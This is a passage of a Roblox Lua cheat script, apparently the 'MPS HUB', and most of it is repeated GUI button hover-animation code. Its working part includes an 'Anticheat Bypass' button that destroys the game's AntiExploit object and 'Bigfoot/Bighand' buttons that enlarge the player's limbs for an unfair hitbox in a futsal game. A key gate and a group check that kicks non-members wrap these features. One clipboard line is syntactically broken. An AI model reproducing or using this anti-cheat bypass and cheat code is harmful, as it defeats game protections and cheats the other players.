	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
end
coroutine.wrap(AMOM_fake_script)()
local function SVMRX_fake_script() -- TextButton_21.LocalScript 
	local script = Instance.new('LocalScript', TextButton_21)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(40, 50, 20)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
end
coroutine.wrap(SVMRX_fake_script)()
local function SSWUOAQ_fake_script() -- TextButton_22.LocalScript 
	local script = Instance.new('LocalScript', TextButton_22)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(200, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
end
coroutine.wrap(SSWUOAQ_fake_script)()
local function EDJZFA_fake_script() -- TextButton_23.LocalScript 
	local script = Instance.new('LocalScript', TextButton_23)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	button.MouseButton1Click:Connect(function()
		
	end)
end
coroutine.wrap(EDJZFA_fake_script)()
local function XEHZL_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	script.Parent.Active = true
	script.Parent.Selectable = true
	script.Parent.Draggable = true
	
	
	game:GetService("UserInputService").InputBegan:Connect(function(K,g)
		if g then return end
		if K.KeyCode == Enum.KeyCode.Comma then
			if script.Parent.Visible == true then
				script.Parent.Visible = false
			else
				script.Parent.Visible = true
			end
		end
	end)
	
end
coroutine.wrap(XEHZL_fake_script)()
local function BGJZVR_fake_script() -- TextButton_24.LocalScript 
	local script = Instance.new('LocalScript', TextButton_24)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
end
coroutine.wrap(BGJZVR_fake_script)()
local function PWBN_fake_script() -- TextButton_25.LocalScript 
	local script = Instance.new('LocalScript', TextButton_25)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
end
coroutine.wrap(PWBN_fake_script)()
local function HLSAD_fake_script() -- TextButton_26.LocalScript 
	local script = Instance.new('LocalScript', TextButton_26)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
end
coroutine.wrap(HLSAD_fake_script)()
local function GURYDXZ_fake_script() -- TextButton_27.LocalScript 
	local script = Instance.new('LocalScript', TextButton_27)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
end
coroutine.wrap(GURYDXZ_fake_script)()
local function YNRBEM_fake_script() -- TextButton_28.LocalScript 
	local script = Instance.new('LocalScript', TextButton_28)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
end
coroutine.wrap(YNRBEM_fake_script)()
local function WJLOTGU_fake_script() -- TextButton_29.LocalScript 
	local script = Instance.new('LocalScript', TextButton_29)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	button.MouseButton1Click:Connect(function()
		setclipboard(discord.gg/rj8PXHXmUe)
	end)
end
coroutine.wrap(WJLOTGU_fake_script)()
end)

local Section = Tab:NewSection("OPSA Anticheat")
Section:NewButton("Bypass", "ButtonInfo", function()
game:GetService("Workspace").Variables.Unused.AntiExploit:Destroy()
end)

local Section = Tab:NewSection("FUTSAL")
Section:NewButton("Enable Bigfoot", "ButtonInfo", function()
game.Players.LocalPlayer.Character["Right Leg"].Massless = true
game.Players.LocalPlayer.Character["Right Leg"].Size = Vector3.new(10.0, 2, 10.0)
game.Players.LocalPlayer.Character["Right Leg"].Transparency = 0.7

game.Players.LocalPlayer.Character["Left Leg"].Massless = true
game.Players.LocalPlayer.Character["Left Leg"].Size = Vector3.new(10.0, 2, 10.0)
game.Players.LocalPlayer.Character["Left Leg"].Transparency = 0.7
end)

Section:NewButton("Disable Bigfoot", "ButtonInfo", function()
game.Players.LocalPlayer.Character["Right Leg"].Massless = true
game.Players.LocalPlayer.Character["Right Leg"].Size = Vector3.new(1.0, 2, 1.0)
game.Players.LocalPlayer.Character["Right Leg"].Transparency = 0

game.Players.LocalPlayer.Character["Left Leg"].Massless = true
game.Players.LocalPlayer.Character["Left Leg"].Size = Vector3.new(1.0, 2, 1.0)
game.Players.LocalPlayer.Character["Left Leg"].Transparency = 0
end)

Section:NewButton("Enable Bighand", "ButtonInfo", function()
game.Players.LocalPlayer.Character["Right Arm"].Massless = true
game.Players.LocalPlayer.Character["Right Arm"].Size = Vector3.new(10.0, 2, 10.0)
game.Players.LocalPlayer.Character["Right Arm"].Transparency = 0.7

game.Players.LocalPlayer.Character["Left Arm"].Massless = true
game.Players.LocalPlayer.Character["Left Arm"].Size = Vector3.new(10.0, 2, 10.0)
game.Players.LocalPlayer.Character["Left Arm"].Transparency = 0.7
end)

Section:NewButton("Disable Bighand", "ButtonInfo", function()
game.Players.LocalPlayer.Character["Right Arm"].Massless = true
game.Players.LocalPlayer.Character["Right Arm"].Size = Vector3.new(1.0, 2, 1.0)
game.Players.LocalPlayer.Character["Right Arm"].Transparency = 0

game.Players.LocalPlayer.Character["Left Arm"].Massless = true
game.Players.LocalPlayer.Character["Left Arm"].Size = Vector3.new(1.0, 2, 1.0)
game.Players.LocalPlayer.Character["Left Arm"].Transparency = 0
end)
------------

local Tab = Window:NewTab("Toggle")
local Section = Tab:NewSection("TOGGLE")

Section:NewKeybind("To Hide GUI", "Hide GUI", Enum.KeyCode.P, function()
	Library:ToggleUI()
end)

wait(0.1)

-- test --

local StarterGui = game:GetService("StarterGui")
                             StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "[RUS]: MPS HUB has been loaded! Press P to hide it.", Color = Color3.fromRGB(0, 100, 188), Font = Enum.Font.Gotham} )


local function EVUOS_fake_script() -- TextLabel.LocalScript 
	local script = Instance.new('LocalScript', TextLabel)

	wait(2.5)
	
	local ts = game:GetService("TweenService")
	
	local ti = TweenInfo.new(0.8, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
	local tIn = {Position = UDim2.new(0.819, 0,0.815, 0)}
	
	local createIn = ts:Create(script.Parent, ti, tIn)
	
	createIn:Play()
	
	
	
	script.Parent.MouseEnter:Connect(function()
		local info1 = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, 0, false, 0)
	
		local tween1 = ts:Create(script.Parent, info1, {TextTransparency = 0})
	
		tween1:Play()
	
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local info2 = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, 0, false, 0)
	
		local tween2 = ts:Create(script.Parent, info2, {TextTransparency = 0.5})
	
		tween2:Play()
	
	end)
end
coroutine.wrap(EVUOS_fake_script)()
local function JBMHO_fake_script()
	local script = Instance.new('LocalScript', TextLabel_2)

	wait(2.5)
	
	local ts = game:GetService("TweenService")
	
	local ti = TweenInfo.new(1.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
	local tIn = {Position = UDim2.new(0.81, 0,0.899, 0)}
	
	local createIn = ts:Create(script.Parent, ti, tIn)
	
	createIn:Play()
	
	
	
	
	script.Parent.MouseEnter:Connect(function()
		local info1 = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, 0, false, 0)
	
		local tween1 = ts:Create(script.Parent, info1, {TextTransparency = 0})
	
		tween1:Play()
	
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local info2 = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, 0, false, 0)
	
		local tween2 = ts:Create(script.Parent, info2, {TextTransparency = 0.5})
	
		tween2:Play()
	
	end)
end
coroutine.wrap(JBMHO_fake_script)()

-- test --
game.StarterGui:SetCore("SendNotification", {
Title = "MPS FUCKER LOADED"; -- the title (ofc)
Text = "ez,  made by rus,lt"; -- what the text says (ofc)
Duration = 2; -- how long the notification should in secounds
})

else
      lc:kick("Not In Group,Copied Link,Paste It On Your Browser") -- Doesn't have to be kicked
      setclipboard(grouplink)
end
OrionLib:Destroy() -- keep this its needed
end


Key:AddTextbox({
    Name = "Enter Key",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        _G.KeyInput = Value
    end      
})


Key:AddButton({
    Name = "Check Key",
    Callback = function()
              if _G.KeyInput == _G.Key then
                MakeScriptHub()
print("Loaded")
            end
      end    
})
